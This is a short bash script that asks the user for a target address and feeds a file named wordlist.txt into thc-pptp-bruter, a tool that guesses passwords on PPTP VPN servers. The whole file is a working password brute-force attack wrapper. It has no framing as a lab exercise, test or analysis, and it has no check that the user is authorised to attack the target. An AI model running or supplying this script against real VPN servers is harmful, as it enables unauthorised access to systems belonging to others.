#!/bin/bash
read -p "[+] Enter Target : " Target
cat wordlist.txt | thc-pptp-bruter $Target